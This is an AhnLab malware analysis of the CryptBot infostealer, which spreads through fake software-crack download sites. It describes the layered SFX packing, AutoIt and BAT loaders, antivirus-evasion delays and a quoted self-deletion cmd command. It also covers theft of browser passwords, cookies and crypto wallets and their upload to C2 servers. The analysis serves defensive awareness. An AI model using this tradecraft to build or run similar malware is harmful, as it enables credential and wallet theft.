CryptBot Infostealer Constantly Changing and Being
Distributed

August 9, 2021

CryptBot is an Infostealer that is being distributed through malicious websites disguised as
software download pages. Because there are multiple malicious websites created and many
of them appear on the top page when keywords such as cracks and serials of popular
commercial software are entered in search engines, many users are subject to download the
malware and run it. In addition, the sample uses the SFX packing, making difficult to
distinguish between normal and malicious files, and changes occur multiple times a day.
Since the websites disguise themselves as download pages, users are convinced by the
seemingly normal file running malware multiple times even when V3 products block it, which
requires users’ extra caution. AhnLab has been continually making blog posts about aiming
to raise people’s awareness of its danger.

Figure 1. Sample of CryptBot distribution website
As shown in the figure below, the malware is compressed into many layers. The final
compressed file has a txt file that contains password.

Figure 2. Compressed file downloaded from malicious website
When the malware is run, it creates folder names such as 7z.SFX.xxx and IXPxxx.TMP in
the %temp% path and files necessary for the infection in the folder. Filenames and
extensions vary for every change. The created files are as follows.

Autoit script (Impedire.vsdx)
Encrypted CryptBot binary (Vento.vsdx)
Autoit executable (Copre.vsdx)
The malware runs the BAT script after creating files. See below for the structure of the script.

Figure 4. BAT script
One thing to note about the script is that it changes periodically. As it can be easily changed,
the attacker alters the pattern by slightly modifying the grammar while maintaining its
features. The following table shows the date of BAT script changes in CryptBot samples that
were collected for about a month. As shown below, the change cycle has become shorter.

The following table shows the main changes. As shown below, while the feature of the BAT
script itself did not change, the grammar or environment variable used has changed slightly.

Table 2. Changed content
When the BAT script is executed, it copies the Autoit executable with the filename [random
name].exe.com. It then copies the Autoit script with a certain filename and gives the script as
an argument to run the file.

Figure 5. Executed Autoit

process

5/9

The Autoit script decrypts the encrypted binary to copy it to the virtual memory area and run
it.

Figure 6. Decrypted CryptBot malware binary
When the CryptBot binary loaded in the memory is executed, it scans for directories of
certain anti-malware products. When the directory exists, the binary generates a random
number and performs Sleep for that amount. It is assumed that delay execution is done to
bypass detection.

Figure 7. Scan

code for directories of anti-malware products
The code then scans for the existence of a particular directory. If the directory already exists,
the script considers either a duplicate execution or an already infected system, and selfdeletes after termination. The name of the directory differs for each sample.

Figure 8. Duplicate execution

scan
When performing self-deletion, the script runs the following cmd command through the
ShellExecuteW function.

6/9

/c rd /s /q %Temp%\[name of the created directory] & timeout 2 & del /f /q “[malware
execution path]”
Table 3. Command for self-deletion
When the malware begins its malicious behaviors, it creates a random directory in %TEMP%
and collects various user information. The following shows the information collected by the
sample.
Browser Information (Chrome, Firefox, and Opera)
Cookie
Saved form data
Saved account names and passwords
Cryptocurrency wallet information
System info
Name of executed sample
OS and Country information
User account and PC name
Hardware information
List of installed programs

7/9

Figure 10. Collected data of system info
When information collection is complete, everything in the created directory is compressed
into a ZIP file with a password and sent to C2. The .top domain which changes often is
mainly used for the C2 URL. For a CryptBot malware sample, there are usually 3 C2s in
total: 2 for sending information and 1 for downloading additional malware.

Figure 11. C2 Transmission Code

When the C2 transmission process is complete, the malware accesses a particular URL and
runs additional malware after downloading it. ClipBanker types are usually downloaded.

Figure 12. Code for downloading and running additional malware
If the system is infected by this malware, confidential information such as account names,
passwords, and cryptocurrency wallets is leaked. It is highly likely that there will be
secondary damages exploiting the leaked information, users need to take caution.
AhnLab’s anti-malware software, V3, detects and blocks the malware using the following
aliases:
